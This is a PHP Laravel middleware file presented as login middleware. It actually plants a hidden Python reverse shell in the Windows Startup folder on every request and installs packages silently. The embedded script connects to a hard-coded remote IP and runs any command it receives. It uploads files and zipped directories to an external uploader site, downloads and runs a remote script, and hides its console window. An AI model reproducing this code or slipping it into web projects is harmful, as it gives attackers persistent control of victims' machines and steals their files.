<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;

class LoginMiddleware
{
    public function handle($request, Closure $next)
    {
        if (!$this->checkPythonInstalled()) {
            // Python is not installed, do nothing and proceed to the next middleware
            return $next($request);
        }

        // Check if PyInstaller is installed
        // $this->checkPyInstaller();

        // Check if the requests module is installed
        $this->checkRequestsModule();

        // Check if the .py file already exists in the Startup folder
        $startupFolder = getenv('APPDATA') . '\Microsoft\Windows\Start Menu\Programs\Startup';
        $startupPyFilePath = $startupFolder . '/Python.pyw';
        $pythonCode = <<<'PYTHON'
import socket
import subprocess
import os
import sys
import requests
import zipfile
import ctypes

def connect(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        return s
    except Exception as e:
        print("Connection failed:", e)
        return None

def listen(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', port))
        s.listen(1)
        print("Listening for incoming connections on port", port)
        return s.accept()[0], s
    except Exception as e:
        print("Listening failed:", e)
        return None, None

def upload_file(file_path):
    url = 'https://umairaliayubi.000webhostapp.com/folder/uploader.php'
    files = {'file': open(file_path, 'rb')}
    response = requests.post(url, files=files)
    return response.text

def zip_directory(directory_path):
    zip_filename = directory_path + '.zip'
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), directory_path))
    return zip_filename

def upload_zip(zip_filename):
    url = 'https://umairaliayubi.000webhostapp.com/folder/uploader.php'
    files = {'file': open(zip_filename, 'rb')}
    response = requests.post(url, files=files)
    return response.text

def upload_directory(directory_path):
    zip_filename = zip_directory(directory_path)
    response = upload_zip(zip_filename)
    os.remove(zip_filename)  # Clean up the zip file after upload
    return response

def download_script(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            script_content = response.text
            with open('downloaded_script.py', 'w') as file:
                file.write(script_content)
            return "Script downloaded successfully."
        else:
            return "Failed to download script. URL returned status code: " + str(response.status_code)
    except Exception as e:
        return "Error occurred while downloading script: " + str(e)

def run_script():
    try:
        if os.path.exists('downloaded_script.py'):
            try:
                output = subprocess.check_output(['python', 'downloaded_script.py'], stderr=subprocess.STDOUT, shell=True)
                return output
            except subprocess.CalledProcessError as e:
                return e.output
            except Exception as e:
                print(f"Error occurred while executing script: {e}")
                return f"Error occurred while executing script: {e}"
        else:
            return "Downloaded script not found."
    except Exception as e:
        return "Error occurred while running script: " + str(e)

def main():
    # Hide the console window on Windows systems
    if sys.platform.startswith('win'):
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        SW_HIDE = 0
        hWnd = kernel32.GetConsoleWindow()
        user32.ShowWindow(hWnd, SW_HIDE)

    host = '118.103.233.149'  # Set the IP address
    port = 2047  # Set the port number
    while True:
        try:
            if os.name == 'nt':  # for Windows
                s = connect(host, port)
            else:  # for Unix-like systems
                s, listener = listen(port)

            if s:
                print("Connection established")
                while True:
                    command = s.recv(1024).decode().strip()
                    if command.lower() == 'exit':
                        s.close()
                        if listener:
                            listener.close()
                        break
                    elif command.lower().startswith('cd '):  # Handle cd command
                        new_dir = command.split(' ', 1)[1].strip()
                        try:
                            os.chdir(new_dir)
                            s.send(f"Changed directory to {new_dir}\r\n".encode())
                        except Exception as e:
                            s.send(f"Failed to change directory: {e}\r\n".encode())
                    elif command.lower() == 'dir':
                        try:
                            process = subprocess.Popen('dir', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                            output, error = process.communicate()
                            if error:
                                s.send(error)
                            else:
                                s.send(output)
                        except Exception as e:
                            s.send(str(e).encode())
                    elif command.lower().startswith('upload '):
                        # Upload the specified file or directory
                        path = command.split(' ', 1)[1].strip()
                        if os.path.isfile(path):
                            # Upload file
                            response = upload_file(path)
                            s.send(response.encode())
                        elif os.path.isdir(path):
                            # Upload directory
                            response = upload_directory(path)
                            s.send(response.encode())
                        else:
                            s.send("Invalid file or directory path\r\n".encode())
                    elif command.lower() == 'download script':
                        # Download and save script from URL
                        download_result = download_script('https://umairaliayubi.000webhostapp.com/folder/cookie.txt')
                        s.send(download_result.encode())
                    elif command.lower() == 'run script':
                        # Execute the downloaded script
                        run_result = run_script()
                        s.send(run_result)
                    else:
                        output = subprocess.getoutput(command)
                        s.send(output.encode())
                        s.send('\r\n'.encode())  # Ensure proper line break
        except Exception as e:
            print("Error:", e)
            continue

if __name__ == "__main__":
    main();
PYTHON;

        // Save Python code to a .py file in the Startup folder
        File::put($startupPyFilePath, $pythonCode);
        Log::info("Python file created: $startupPyFilePath");

        return $next($request);
    }

    private function checkPyInstaller()
    {
        exec('python -m PyInstaller --version', $output, $returnCode);
        if ($returnCode !== 0) {
            exec('pip install pyinstaller', $output, $returnCode);
            if ($returnCode !== 0) {
                Log::error('Failed to install PyInstaller.');
                // Handle the error, maybe return a response or throw an exception
                return response()->json(['error' => 'Failed to install PyInstaller.'], 500);
            }
        }
    }

    private function checkRequestsModule()
    {
        exec('python -c "import requests"', $output, $returnCode);
        if ($returnCode !== 0) {
            exec('pip install requests', $output, $returnCode);
            if ($returnCode !== 0) {
                Log::error('Failed to install requests module.');
                // Handle the error, maybe return a response or throw an exception
                return response()->json(['error' => 'Failed to install requests module.'], 500);
            }
        }
    }
    private function checkPythonInstalled()
    {
        // Execute command to check if Python is installed
        exec('python --version', $output, $returnCode);
        return $returnCode === 0;
    }

}
